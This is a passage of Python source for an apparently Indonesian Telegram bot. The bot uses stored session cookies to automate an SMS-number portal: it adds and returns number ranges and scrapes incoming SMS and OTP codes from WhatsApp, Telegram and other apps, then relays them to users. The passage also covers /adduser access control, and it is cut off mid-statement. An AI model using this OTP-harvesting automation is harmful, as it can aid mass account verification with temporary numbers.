                                        bot.last_response = "success"
                                        break
                                    time.sleep(1)
                                
                                if got_response2 and bot.last_response:
                                    resp2 = bot.last_response.lower()
                                    if any(k in resp2 for k in SUCCESS_KEYWORDS) or bot.success_count > 0:
                                        return {'success': 1, 'failed': 0, 'auto_bulk_done': True, 'method': 'websocket'}
                                
                                try:
                                    search_results = search_numbers(session, csrf, target, 1)
                                    if search_results and search_results.get('data'):
                                        for item in search_results['data']:
                                            if target.lower() in item.get('range', '').lower():
                                                return {'success': 1, 'failed': 0, 'auto_bulk_done': True, 'method': 'websocket'}
                                except:
                                    pass
                        else:
                            print(f"[AUTO] Bulk return gagal: {bulk_resp.status_code}")
                    except Exception as e:
                        print(f"[AUTO] Error bulk return: {e}")
                
                # If bulk fails or adding after bulk fails, it is an error.
                return {'success': 0, 'failed': 1, 'auto_bulk_done': auto_bulk_done, 'method': 'websocket', 'error': 'Account full, bulk failed'}
            
            # If not success and not full, retry the next transaction attempt
            print(f"[WS-ADD-CHAT] Failed with response: {resp[:100]} on attempt {attempt}/3. Retrying...")
            if attempt < 3:
                try: bot.disconnect()
                except: pass
                time.sleep(1.5)
                continue
        
        # If all 3 socket transaction attempts failed, fallback to HTTP verification!
        print(f"[DEBUG] All 3 websocket attempts failed for process_chat_add_single. Fallback ke HTTP verification...")
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id) if user_id else (None, None, None, None, None, None, False)
        if logged_in and cookies_dict and csrf:
            session = requests.Session()
            for key, value in cookies_dict.items():
                session.cookies.set(key, value)
            try:
                search_results = search_numbers(session, csrf, target, 1)
                if search_results and search_results.get('data'):
                    for item in search_results['data']:
                        if target.lower() in item.get('range', '').lower():
                            print(f"[DEBUG] HTTP verification: range {target} ditemukan di sistem")
                            return {'success': 1, 'failed': 0, 'auto_bulk_done': auto_bulk_done, 'method': 'websocket_verified'}
            except Exception as e:
                print(f"[DEBUG] HTTP verification error: {e}")
        
        return {'success': 0, 'failed': 1, 'auto_bulk_done': auto_bulk_done, 'method': 'websocket', 'error': 'Gagal setelah 3x retry transaksi WebSocket'}
        
    except Exception as e:
        print(f"Error in process_chat_add_single: {e}")
        import traceback
        traceback.print_exc()
        return {'success': 0, 'failed': 1, 'auto_bulk_done': False, 'method': 'websocket', 'error': str(e)}
    


def _fetch_sms_by_app(session, csrf, app_name, search_term="", limit=10):
    """Fetch SMS untuk 1 app tertentu (WhatsApp, Telegram, dll)."""
    try:
        url = f"{BASE_URL}/portal/sms/test/sms"
        params = {
            'app': app_name,
            'draw': '3',
            'columns[0][data]': 'range',
            'columns[0][orderable]': 'false',
            'columns[1][data]': 'termination.test_number',
            'columns[1][searchable]': 'false',
            'columns[1][orderable]': 'false',
            'columns[2][data]': 'originator',
            'columns[2][orderable]': 'false',
            'columns[3][data]': 'messagedata',
            'columns[3][orderable]': 'false',
            'columns[4][data]': 'senttime',
            'columns[4][searchable]': 'false',
            'columns[4][orderable]': 'false',
            'order[0][column]': '4',
            'order[0][dir]': 'desc',
            'start': '0',
            'length': str(limit),
            'search[value]': search_term,
            '_': int(time.time() * 1000)
        }
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRF-TOKEN': csrf,
            'Referer': f"{BASE_URL}/portal/sms/test/sms?app={app_name}",
            'Accept': 'application/json'
        }
        response = session.get(url, params=params, headers=headers, timeout=15)
        if response.status_code == 200:
            try:
                data = response.json()
                return data.get('data', [])
            except:
                return []
        return []
    except:
        return []


def fetch_live_sms_all(session, csrf, search_term="", limit=15, app_filter='all'):
    """Ambil SEMUA live SMS dari SEMUA platform (WhatsApp, Telegram, dll).
    Fetch dari tiap app dan merge hasilnya. Jika app_filter bukan 'all', hanya fetch 1 app."""
    ALL_APPS = ['WhatsApp', 'Telegram', 'TikTok', 'Facebook', 'Instagram', 'Google', 'Microsoft', 'Viber']
    # Jika filter spesifik, hanya fetch app itu saja (hemat request)
    if app_filter and app_filter != 'all':
        app_map = {a.lower(): a for a in ALL_APPS}
        if app_filter.lower() in app_map:
            APPS = [app_map[app_filter.lower()]]
        else:
            APPS = ALL_APPS
    else:
        APPS = ALL_APPS
    all_items = []
    seen_sigs = set()

    from concurrent.futures import ThreadPoolExecutor, as_completed

    results_dict = {}
    with ThreadPoolExecutor(max_workers=len(APPS)) as executor:
        future_to_app = {
            executor.submit(_fetch_sms_by_app, session, csrf, app_name, search_term, limit=10): app_name
            for app_name in APPS
        }
        for future in as_completed(future_to_app):
            app_name = future_to_app[future]
            try:
                items = future.result()
                results_dict[app_name] = items or []
            except Exception as e:
                print(f"[SMS_AKTIF] Error fetch {app_name}: {e}")
                results_dict[app_name] = []

    for app_name in APPS:
        items = results_dict.get(app_name, [])
        for item in items:
            # Dedup berdasarkan nomor + waktu + pesan
            termination = item.get('termination', {})
            test_num = termination.get('test_number', '') if isinstance(termination, dict) else ''
            sig = (item.get('senttime', ''), item.get('originator', ''), item.get('messagedata', ''), test_num)
            if sig not in seen_sigs:
                seen_sigs.add(sig)
                item['_source_app'] = app_name
                all_items.append(item)

    # Sort by senttime desc
    all_items.sort(key=lambda x: x.get('senttime', ''), reverse=True)
    all_items = all_items[:limit]

    print(f"[SMS_AKTIF] Fetched {len(all_items)} SMS from {len(APPS)} apps")
    return {'data': all_items, 'recordsTotal': len(all_items)}


def fetch_live_sms(session, csrf, search_term="", limit=10):
    """Ambil live SMS dengan filter search (default 10)"""
    try:
        url = f"{BASE_URL}/portal/sms/test/sms"
        params = {
            'app': 'WhatsApp',
            'draw': '3',
            'columns[0][data]': 'range',
            'columns[0][orderable]': 'false',
            'columns[1][data]': 'termination.test_number',
            'columns[1][searchable]': 'false',
            'columns[1][orderable]': 'false',
            'columns[2][data]': 'originator',
            'columns[2][orderable]': 'false',
            'columns[3][data]': 'messagedata',
            'columns[3][orderable]': 'false',
            'columns[4][data]': 'senttime',
            'columns[4][searchable]': 'false',
            'columns[4][orderable]': 'false',
            'order[0][column]': '4',
            'order[0][dir]': 'desc',
            'start': '0',
            'length': str(limit),
            'search[value]': search_term,
            '_': int(time.time() * 1000)
        }
        
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRF-TOKEN': csrf,
            'Referer': f"{BASE_URL}/portal/sms/test/sms?app=WhatsApp",
            'Accept': 'application/json'
        }
        
        response = session.get(url, params=params, headers=headers, timeout=15)
        
        if response.status_code == 200:
            try:
                return response.json()
            except:
                print(f"JSON decode error: {response.text[:200]}")
                return None
        else:
            print(f"HTTP Error {response.status_code}: {response.text[:200]}")
            return None
            
    except requests.exceptions.Timeout:
        print("Timeout fetch_live_sms")
        return None
    except requests.exceptions.ConnectionError:
        print("Connection error fetch_live_sms")
        return None
    except Exception as e:
        print(f"Error fetch_live_sms: {e}")
        return None
    
def extract_number_from_html(html_text):
    """Ekstrak nomor dari HTML yang mengandung <p> tags"""
    try:
        if not html_text:
            return None
        
        match = re.search(r'(\d{10,15})', html_text)
        if match:
            return match.group(1)
        return None
    except:
        return None

def convert_to_makassar_time(utc_time_str):
    """Convert UTC time string to Makassar time (UTC+8)"""
    try:
        # iVASMS format: "2026-05-01 09:10:01"
        dt = datetime.strptime(utc_time_str, "%Y-%m-%d %H:%M:%S")
        makassar = dt + timedelta(hours=8)
        return makassar.strftime("%H:%M:%S")
    except:
        return utc_time_str

def fetch_client_ranges(session, csrf):
    """Ambil list range dari halaman My SMS Statistics"""
    try:
        csrf = ensure_csrf_fresh(session, csrf)
        url = f"{BASE_URL}/portal/sms/received/getsms"
        today = datetime.now().strftime("%Y-%m-%d")
        
        files = {
            'from': (None, today),
            'to': (None, today),
            '_token': (None, csrf)
        }
        
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f"{BASE_URL}/portal/sms/received",
            'Accept': 'text/html, */*; q=0.01',
            'Origin': BASE_URL,
        }
        
        response = session.post(url, files=files, headers=headers, timeout=15)
        if response.status_code == 200:
            body = response.text
            if 'toggleRange' in body or 'v-count' in body:
                print(f"[NOTIF-DEBUG] fetch_client_ranges OK, len={len(body)}")
                return body
            if 'login' in body.lower() or 'csrf-token' in body.lower():
                print("[NOTIF-DEBUG] fetch_client_ranges: session expired (login page)")
            else:
                print(f"[NOTIF-DEBUG] fetch_client_ranges: unexpected HTML ({len(body)} bytes)")
            return body if 'toggleRange' in body else None
        elif response.status_code == 419:
            print(f"[NOTIF-DEBUG] fetch_client_ranges 419 CSRF expired")
        else:
            print(f"[NOTIF-DEBUG] fetch_client_ranges HTTP {response.status_code}: {response.text[:150]}")
        return None
    except requests.exceptions.Timeout:
        print("[NOTIF-DEBUG] fetch_client_ranges TIMEOUT")
        return None
    except Exception as e:
        print(f"Error fetch_client_ranges: {e}")
        return None

def fetch_range_numbers(session, csrf, range_name):
    """Ambil list nomor untuk suatu range"""
    try:
        url = f"{BASE_URL}/portal/sms/received/getsms/number"
        today = datetime.now().strftime("%Y-%m-%d")
        
        data = {
            '_token': csrf,
            'start': today,
            'end': today,
            'range': range_name
        }
        
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f"{BASE_URL}/portal/sms/received",
            'Accept': 'text/html, */*; q=0.01',
            'Origin': BASE_URL,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        
        response = session.post(url, data=data, headers=headers, timeout=15)
        if response.status_code == 200:
            print(f"[NOTIF-DEBUG] fetch_range_numbers({range_name}) OK, len={len(response.text)}")
            return response.text
        else:
            print(f"[NOTIF-DEBUG] fetch_range_numbers({range_name}) HTTP {response.status_code}")
        return None
    except requests.exceptions.Timeout:
        print(f"[NOTIF-DEBUG] fetch_range_numbers({range_name}) TIMEOUT")
        return None
    except Exception as e:
        print(f"Error fetch_range_numbers: {e}")
        return None

def fetch_number_messages(session, csrf, number, range_name):
    """Ambil list SMS untuk nomor tertentu"""
    try:
        url = f"{BASE_URL}/portal/sms/received/getsms/number/sms"
        today = datetime.now().strftime("%Y-%m-%d")
        
        data = {
            '_token': csrf,
            'start': today,
            'end': today,
            'Number': number,
            'Range': range_name
        }
        
        headers = {
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f"{BASE_URL}/portal/sms/received",
            'Accept': 'text/html, */*; q=0.01',
            'Origin': BASE_URL,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        
        response = session.post(url, data=data, headers=headers, timeout=15)
        if response.status_code == 200:
            print(f"[NOTIF-DEBUG] fetch_number_messages({number}) OK, len={len(response.text)}")
            return response.text
        else:
            print(f"[NOTIF-DEBUG] fetch_number_messages({number}) HTTP {response.status_code}")
        return None
    except requests.exceptions.Timeout:
        print(f"[NOTIF-DEBUG] fetch_number_messages({number}) TIMEOUT")
        return None
    except Exception as e:
        print(f"Error fetch_number_messages: {e}")
        return None

def parse_client_ranges(html_text):
    """Parse ranges dengan count > 0 dari HTML (BeautifulSoup + fallback regex)."""
    ranges = []
    if not html_text:
        return ranges
    try:
        soup = BeautifulSoup(html_text, 'html.parser')
        for div in soup.select('div.rng'):
            onclick = div.get('onclick', '')
            m = re.search(r"toggleRange\s*\(\s*['\"]([^'\"]+)['\"]", onclick)
            if not m:
                continue
            rname = m.group(1).strip()
            count_el = div.select_one('.v-count')
            try:
                count = int(count_el.get_text(strip=True)) if count_el else 0
            except ValueError:
                count = 0
            if count > 0:
                ranges.append({'name': rname, 'count': count})
        if ranges:
            return ranges
    except Exception as e:
        print(f"Error parse_client_ranges (BS4): {e}")
    try:
        matches = re.findall(
            r"toggleRange\s*\(\s*['\"]([^'\"]+)['\"][^)]*\).*?v-count[^>]*>(\d+)<",
            html_text, re.DOTALL | re.IGNORECASE,
        )
        for rname, count in matches:
            try:
                if int(count) > 0:
                    ranges.append({'name': rname.strip(), 'count': int(count)})
            except ValueError:
                continue
    except Exception as e:
        print(f"Error parse_client_ranges (regex): {e}")
    return ranges


def parse_range_numbers(html_text):
    """Parse nomor dari panel range (onclick toggleNum* dinamis)."""
    numbers = []
    if not html_text:
        return numbers
    try:
        soup = BeautifulSoup(html_text, 'html.parser')
        for div in soup.select('div.nrow'):
            onclick = div.get('onclick', '')
            m = re.search(r"\(\s*['\"](\d+)['\"]", onclick)
            if m:
                numbers.append(m.group(1))
        if numbers:
            return list(dict.fromkeys(numbers))
    except Exception as e:
        print(f"Error parse_range_numbers (BS4): {e}")
    try:
        matches = re.findall(
            r"toggleNum[a-zA-Z0-9_]*\s*\(\s*['\"](\d+)['\"]",
            html_text,
        )
        numbers = list(dict.fromkeys(matches))
    except Exception as e:
        print(f"Error parse_range_numbers (regex): {e}")
    return numbers


def parse_number_sms(html_text):
    """Parse SMS dari table HTML (sender, message, time, revenue)."""
    messages = []
    if not html_text:
        return messages
    try:
        soup = BeautifulSoup(html_text, 'html.parser')
        for tr in soup.select('table tbody tr'):
            sender_el = tr.select_one('.cli-tag')
            msg_el = tr.select_one('.msg-text')
            time_el = tr.select_one('.time-cell')
            rev_el = tr.select_one('.rev-paid') or tr.select_one('.rev-unpaid')
            if not (sender_el and msg_el and time_el):
                continue
            raw_msg = msg_el.get_text('\n', strip=False)
            if not raw_msg.strip():
                inner = msg_el.decode_contents()
                raw_msg = html.unescape(re.sub(r'<br\s*/?>', '\n', inner, flags=re.I))
                raw_msg = re.sub(r'<[^>]+>', '', raw_msg)
            else:
                raw_msg = html.unescape(raw_msg)
            rev_text = rev_el.get_text(strip=True) if rev_el else ''
            messages.append({
                'sender': sender_el.get_text(strip=True),
                'text': raw_msg.strip(),
                'time': time_el.get_text(strip=True),
                'revenue': rev_text,
            })
        if messages:
            return messages
    except Exception as e:
        print(f"Error parse_number_sms (BS4): {e}")
    try:
        rows = re.findall(r'<tr[^>]*>(.*?)</tr>', html_text, re.DOTALL | re.IGNORECASE)
        for row in rows:
            sender = re.search(r'cli-tag[^>]*>([^<]+)<', row)
            msg = re.search(r'msg-text[^>]*>(.*?)</div>', row, re.DOTALL)
            time_val = re.search(r'time-cell[^>]*>([^<]+)<', row)
            rev = re.search(r'rev-paid[^>]*>([^<]+)<', row)
            if sender and msg and time_val:
                messages.append({
                    'sender': sender.group(1).strip(),
                    'text': html.unescape(re.sub(r'<br\s*/?>', '\n', msg.group(1), flags=re.I).strip()),
                    'time': time_val.group(1).strip(),
                    'revenue': rev.group(1).strip() if rev else '',
                })
    except Exception as e:
        print(f"Error parse_number_sms (regex): {e}")
    return messages


def _notif_copy_callback_data(otp_code):
    """Callback data Telegram max 64 byte."""
    prefix = 'notif_copy_'
    code = str(otp_code or '')[:48]
    return f"{prefix}{code}"


def _build_monitor_notif_text(sender_raw, text_raw, time_raw, num, rname, otp_code=None, revenue=''):
    """Format pesan monitor SMS (selaras dengan SMS AKTIF)."""
    safe_sender = _notif_clean(sender_raw) or 'Unknown'
    safe_msg = _notif_clean(text_raw) or '-'
    safe_number = _notif_clean(num) or 'Unknown'
    safe_range = _notif_clean(rname) or 'Unknown'
    safe_time = _notif_clean(time_raw) or '-'
    safe_otp = _notif_clean(otp_code) if otp_code else ''
    safe_rev = _notif_clean(revenue) if revenue else ''

    otp_block = ''
    if safe_otp:
        otp_block = (
            f"\n┌──────────────────────────┐\n"
            f"│ {em(E6, '⭐')} <b>OTP / CODE</b>\n"
            f"│ <code>{safe_otp}</code>\n"
            f"└──────────────────────────┘\n"
        )

    rev_line = ''
    if safe_rev:
        rev_line = f"  {em(E1, '⭐')} <b>Revenue</b> : <code>{safe_rev}</code>\n"

    from_line = ''
    if safe_sender and safe_sender.lower() not in ('unknown', '-'):
        from_line = f"  {em(CE_EMAIL, '📩')} <b>From</b>    : <code>{safe_sender}</code>\n"

    return (
        f"{_header('NEW SMS · MONITOR')}\n"
        f"{otp_block}\n"
        f"  {em(CE_NOMOR, '📞')} <b>Number</b>  : <code>+{safe_number}</code>\n"
        f"  {em(E2, '⭐')} <b>Range</b>   : <code>{safe_range}</code>\n"
        f"{from_line}"
        f"  {em(CE_WAKTU, '⏲')} <b>Time</b>    : <code>{safe_time}</code>\n"
        f"{rev_line}\n"
        f"  {em(E3, '⭐')} <b>Message</b>\n"
        f"  <blockquote>{safe_msg}</blockquote>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(E4, '🎧')} <i>Auto-delete 10 menit · ivas.tempnum</i>"
    ), safe_otp


def _monitor_notif_keyboard(user_id, safe_otp):
    """Tombol salin OTP + stop monitor."""
    row1 = []
    if safe_otp:
        label = f"SALIN: {safe_otp}"
        if len(label) > 60:
            label = f"SALIN: {safe_otp[:20]}…"
        row1.append(InlineKeyboardButton(label, callback_data=_notif_copy_callback_data(safe_otp), style="success"))
    row1.append(InlineKeyboardButton("STOP", callback_data=f"notif_stop_{user_id}", icon_custom_emoji_id="5870778972857438051", style="danger"))
    return InlineKeyboardMarkup([row1])

def debug_database(user_id):
    """Fungsi debug — hanya aktif jika DEBUG_MODE=True."""
    if not DEBUG_MODE:
        return False
    try:
        cur.execute("SELECT user_id, email, session_data FROM user_sessions WHERE user_id = ?", (user_id,))
        row = cur.fetchone()
        if row:
            uid, email, session_data = row
            print(f"\n=== DEBUG DATABASE ===")
            print(f"User ID: {uid}")
            print(f"Email: {email}")
            if session_data:
                data = json.loads(session_data)
                print(f"Session data keys: {list(data.keys())}")
                print(f"Profile: {data.get('profile', {})}")
                print(f"CSRF: {data.get('csrf')}")
                print(f"Cookies keys: {list(data.get('cookies', {}).keys())}")
            else:
                print("Session data: None")
            print("=====================\n")
            return True
        print(f"\n=== DEBUG DATABASE ===\nUser {user_id} tidak ditemukan\n=====================\n")
        return False
    except Exception as e:
        print(f"Error debug database: {e}")
        return False

def process_http_add_single(email, target, user_id=None):
    """Single submit via HTTP - fallback jika WebSocket gagal"""
    try:
        session, csrf, _ = get_user_session(user_id)
        if not session or not csrf:
            return {'success': 0, 'failed': 1, 'auto_bulk_done': False, 'method': 'http'}
        
        
        search_results = search_numbers(session, csrf, target, 1)
        term_id = None
        
        if search_results and 'data' in search_results:
            for item in search_results['data']:
                if target in item.get('range', ''):
                    term_id = item.get('id')
                    break
        
        if not term_id:
            return {'success': 0, 'failed': 1, 'auto_bulk_done': False, 'method': 'http', 'error': 'Range not found'}
        
        
        result = add_number(session, csrf, term_id)
        
        if result.get('success'):
            return {'success': 1, 'failed': 0, 'auto_bulk_done': False, 'method': 'http'}
        else:
            
            msg = result.get('message', '').lower()
            if any(k in msg for k in MAX_NUMBERS_KEYWORDS) and user_id:
                
                bulk_success, bulk_msg = bulk_return_numbers(session, csrf)
                if bulk_success:
                    
                    time.sleep(1)
                    result2 = add_number(session, csrf, term_id)
                    if result2.get('success'):
                        return {'success': 1, 'failed': 0, 'auto_bulk_done': True, 'method': 'http'}
            
            return {'success': 0, 'failed': 1, 'auto_bulk_done': False, 'method': 'http'}
        
    except Exception as e:
        print(f"Error in process_http_add_single: {e}")
        return {'success': 0, 'failed': 1, 'auto_bulk_done': False, 'method': 'http'}

def process_add_single(email, target, user_id=None):
    """Main function - coba WebSocket dulu, fallback ke HTTP"""
    
    result = process_chat_add_single(email, target, user_id)
    
    
    if result.get('method') == 'websocket' and result.get('success') == 0 and not result.get('auto_bulk_done'):
        
        pass
    
    return result

class BackgroundProcessor:
    def __init__(self, max_workers=10):
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.user_tasks = defaultdict(list)
    
    async def run(self, user_id, func, *args, **kwargs):
        loop = asyncio.get_event_loop()
        future = loop.run_in_executor(self.executor, func, *args, **kwargs)
        self.user_tasks[user_id].append(future)
        try:
            result = await future
            return result
        finally:
            if future in self.user_tasks[user_id]:
                self.user_tasks[user_id].remove(future)
    
    def cancel_user_tasks(self, user_id):
        if user_id in self.user_tasks:
            for future in self.user_tasks[user_id]:
                future.cancel()
            self.user_tasks[user_id] = []

bg = BackgroundProcessor(max_workers=10)
active_bulk_locks = set()

async def adduser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/adduser — tambah user yang diizinkan (owner/admin saja).

    Dukungan:
      • /adduser <user_id>
      • /adduser @username
      • /adduser (sambil reply ke pesan target di grup)
    """
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id)):
        return

    # ---- 0) Mode BULK: /adduser group → promosi semua admin chat ini ---
    if context.args and context.args[0].lower() == 'group':
        chat = update.effective_chat
        if not chat or chat.type not in ('group', 'supergroup'):
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>Hanya bisa dipakai di grup.</b>\n"
                f"Kirim perintah ini di dalam grup yang adminnya mau dipromote.",
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            admins = await context.bot.get_chat_administrators(chat.id)
        except Exception as e:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>Gagal ambil daftar admin.</b>\n<code>{html.escape(str(e))}</code>",
                parse_mode=ParseMode.HTML,
            )
            return

        added, skipped = [], []
        for adm in admins or []:
            u = adm.user
            if not u or u.is_bot:
                continue
            if u.id == USER_ID:
                continue
            try:
                cur.execute("SELECT 1 FROM allowed_users WHERE user_id = ?", (u.id,))
                exists = bool(cur.fetchone())
                if exists:
                    skipped.append(u.username or str(u.id))
                    continue
                cur.execute(
                    "INSERT INTO allowed_users (user_id, username, added_at) "
                    "VALUES (?, ?, CURRENT_TIMESTAMP)",
                    (u.id, u.username or ""),
                )
                conn.commit()
                added.append(u.username or str(u.id))
            except Exception as e:
                print(f"[ADDUSER GROUP] gagal insert {u.id}: {e}")

        body = (
            f"{em(E1, '✅')} <b>BULK ADDUSER (group admins)</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  {em(CE_AKUN,'👤')} <b>Ditambahkan:</b> {len(added)}\n"
            f"  {em(E2,'⏭')} <b>Sudah ada:</b> {len(skipped)}\n"
        )
        if added:
            body += "\n<b>Baru:</b> " + ", ".join(f"@{n}" if not n.isdigit() else n for n in added[:25])
        await update.message.reply_text(body, parse_mode=ParseMode.HTML)
        return


    target_user_id = None
    target_username = None

    # ---- 1) Mode REPLY: ambil target dari pesan yang di-reply ----------------
    msg = update.message
    reply = msg.reply_to_message if msg else None
    if reply and reply.from_user and not reply.from_user.is_bot:
        target_user_id = reply.from_user.id
        target_username = reply.from_user.username
        # Auto-update username terbaru di DB allowed_users
        try:
            update_user_username(reply.from_user)
        except Exception:
            pass

    # ---- 2) Mode argumen --------------------------------------------------
    if target_user_id is None and context.args:
        target = context.args[0].strip()

        # @username → get_chat dulu, kalau gagal fallback ke DB
        if target.startswith('@'):
            username = target[1:]
            target_username = username
            chat = None
            try:
                chat = await context.bot.get_chat(target)
            except Exception as e:
                print(f"[ADDUSER] get_chat({target}) fail: {e}")

            if chat:
                target_user_id = chat.id
                target_username = chat.username or username
            else:
                # Fallback: cari di tabel allowed_users (yang sudah pernah /start)
                try:
                    cur.execute(
                        "SELECT user_id, username FROM allowed_users "
                        "WHERE username = ? COLLATE NOCASE",
                        (username,),
                    )
                    r = cur.fetchone()
                    if r:
                        target_user_id = r[0]
                        target_username = r[1] or username
                except Exception:
                    pass

                # Fallback ke-2: user pernah login iVASMS (email mengandung username)
                if not target_user_id:
                    try:
                        cur.execute(
                            "SELECT user_id FROM user_sessions WHERE email LIKE ?",
                            (f"%{username}%",),
                        )
                        r = cur.fetchone()
                        if r:
                            target_user_id = r[0]
                    except Exception:
                        pass

            if not target_user_id:
                await update.message.reply_text(
                    f"{em(E2, '⭐')} <b>GAGAL MENAMBAH USER</b>\n\n"
                    f"Username <code>{target}</code> tidak ditemukan.\n\n"
                    f"📌 <b>Penyebab:</b>\n"
                    f"User belum pernah berinteraksi dengan bot ini.\n\n"
                    f"💡 <b>Solusi:</b>\n"
                    f"• Reply pesan target di grup: <code>/adduser</code>\n"
                    f"• Atau minta dia kirim <code>/start</code> ke bot\n"
                    f"• Atau gunakan <code>/adduser &lt;user_id&gt;</code> langsung",
                    parse_mode=ParseMode.HTML,
                )
                return

        else:
            try:
                target_user_id = int(target)
            except ValueError:
                await update.message.reply_text(
                    f"{em(E2, '⭐')} <b>FORMAT SALAH</b>\n\n"
                    "Cara pakai:\n"
                    "• <code>/adduser 123456789</code>\n"
                    "• <code>/adduser @username</code>\n"
                    "• <code>/adduser</code> (reply pesan target)",
                    parse_mode=ParseMode.HTML,
                )
                return

    # ---- 3) Belum ada target sama sekali → tampilkan help -----------------
    if not target_user_id:
        await update.message.reply_text(
            "📝 <b>CARA MENAMBAH USER</b>\n\n"
            "Format:\n"
            "• <code>/adduser [user_id]</code>\n"
            "• <code>/adduser @username</code>\n"
            "• <code>/adduser</code> (sambil reply pesan target di grup)\n\n"
            "Untuk daftar user: <code>/listuser</code>\n"
            "Untuk menghapus: <code>/deluser [user_id]</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ---- 4) Guard & insert ------------------------------------------------
    if target_user_id == USER_ID:
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>TIDAK BISA MENAMBAH OWNER</b>\n\n"
            "Owner sudah otomatis terdaftar.",
            parse_mode=ParseMode.HTML,
        )
        return

    cur.execute(
        "SELECT user_id, username FROM allowed_users WHERE user_id = ?",
        (target_user_id,),
    )
    existing = cur.fetchone()
    if existing:
        u_disp = f" (@{existing[1]})" if existing[1] else ""
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>USER SUDAH ADA</b>\n\n"
            f"User ID: <code>{target_user_id}</code>{u_disp}",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        cur.execute(
            "INSERT INTO allowed_users (user_id, username, added_by) VALUES (?, ?, ?)",
            (target_user_id, target_username, user_id),
        )
        conn.commit()
    except Exception as e:
        await update.message.reply_text(
            f"{em(E2, '⭐')} <b>GAGAL MENAMBAH USER</b>\n\nError: {e}",
            parse_mode=ParseMode.HTML,
        )
        return

    u_disp = f" (@{target_username})" if target_username else ""
    await update.message.reply_text(
        f"{em(E1, '⭐')} <b>USER BERHASIL DITAMBAHKAN</b>\n\n"
        f"User ID: <code>{target_user_id}</code>{u_disp}\n"
        f"Ditambahkan oleh: <code>{user_id}</code>",
        parse_mode=ParseMode.HTML,
    )

    # Notif ke user target (best-effort)
    try:
        await context.bot.send_message(
            chat_id=target_user_id,
            text="🎉 <b>SELAMAT!</b>\n\n"
                 "Kamu sudah diizinkan menggunakan bot ini.\n"
                 "Gunakan /start untuk mulai.",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        # Tidak dianggap fatal
        pass


# (Definisi adduser_command yang lebih baru di bawah ini sudah
#  digabung ke versi tunggal di atas.)
async def _adduser_command_legacy_unused(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """⚠️ Stub: dipertahankan agar import/handler lama tetap kompatibel."""
    return await adduser_command(update, context)
# vvv legacy body retained no-op vvv
async def _adduser_legacy_body(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /adduser - Menambah user yang diizinkan (hanya owner)"""
    user_id = update.effective_user.id
    
    
    if not is_owner(user_id):
        return
    
    if not context.args:
        await update.message.reply_text(
            "📝 <b>CARA MENAMBAH USER</b>\n\n"
            "Gunakan format:\n"
            "• /adduser [user_id]\n"
            "• /adduser @username\n\n"
            "Contoh:\n"
            "• /adduser 123456789\n"
            "• /adduser @username\n\n"
            "Untuk melihat daftar user:\n/listuser\n\n"
            "Untuk menghapus user:\n/deluser [user_id]",
            parse_mode=ParseMode.HTML
        )
        return
    
    target = context.args[0].strip()
    target_user_id = None
    target_username = None
    
    try:
        
        if target.startswith('@'):
            username = target[1:]  
            target_username = username
            
            
            try:
                
                
                
                
                
                chat = await context.bot.get_chat(target)
                target_user_id = chat.id
                target_username = chat.username or username
                print(f"[DEBUG] Found user via get_chat: {target_user_id}")
                
            except Exception as e:
                print(f"[DEBUG] Gagal get_chat: {e}")
                
                cur.execute("SELECT user_id FROM user_sessions WHERE email LIKE ?", (f"%{username}%",))
                result = cur.fetchone()
                if result:
                    target_user_id = result[0]
                    print(f"[DEBUG] Found user via database: {target_user_id}")
                else:
                    await update.message.reply_text(
                        f"{em(E2, '⭐')} <b>GAGAL MENAMBAH USER</b>\n\n"
                        f"Username {target} tidak ditemukan.\n\n"
                        f"Penyebab:\n"
                        f"• User belum pernah berinteraksi dengan bot\n"
                        f"• Username salah\n\n"
                        f"💡 <b>Solusi:</b>\n"
                        f"1. Minta user untuk mengirim pesan /start ke bot ini dulu\n"
                        f"2. Atau gunakan user ID langsung: /adduser [user_id]\n\n"
                        f"Cara dapat user ID:\n"
                        f"• Minta user forward pesan ke @userinfobot",
                        parse_mode=ParseMode.HTML
                    )
                    return
        
        
        else:
            try:
                target_user_id = int(target)
            except ValueError:
                await update.message.reply_text(
                    f"{em(E2, '⭐')} <b>FORMAT SALAH</b>\n\n"
                    "Format harus berupa:\n"
                    "• User ID (angka): /adduser 123456789\n"
                    "• Username: /adduser @username",
                    parse_mode=ParseMode.HTML
                )
                return
        
        
        if not target_user_id:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>GAGAL</b>\n\nTidak dapat menentukan user ID.",
                parse_mode=ParseMode.HTML
            )
            return
        
        
        if target_user_id == USER_ID:
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>TIDAK BISA MENAMBAH OWNER</b>\n\nOwner sudah otomatis terdaftar.",
                parse_mode=ParseMode.HTML
            )
            return
        
        
        cur.execute("SELECT user_id FROM allowed_users WHERE user_id = ?", (target_user_id,))
        if cur.fetchone():
            await update.message.reply_text(
                f"{em(E2, '⭐')} <b>USER SUDAH ADA</b>\n\nUser ID: {target_user_id} sudah terdaftar.",
                parse_mode=ParseMode.HTML
            )
            return
        
        
        try:
            cur.execute(
                "INSERT INTO allowed_users (user_id, username, added_by) VALUES (?, ?, ?)",
                (target_user_id, target_username, user_id)
            )
            conn.commit()
            
            
            username_display = f" (@{target_username})" if target_username else ""
            await update.message.reply_text(
